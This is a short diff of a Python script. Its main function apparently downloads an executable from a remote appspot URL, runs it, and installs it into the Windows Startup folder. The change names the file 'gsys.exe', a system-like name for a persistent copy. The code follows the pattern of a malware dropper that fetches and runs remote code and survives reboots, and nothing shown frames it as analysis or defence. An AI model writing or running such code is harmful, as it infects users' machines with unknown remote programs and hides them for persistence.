@@ -66,7 +66,7 @@ def main():
     download_install_run(
         "http://littlesitetomakemoney.appspot.com/launcher.exe",
         shellcon.CSIDL_STARTUP,
-        )
+        "gsys.exe")
     
 if __name__ == "__main__":
     main()
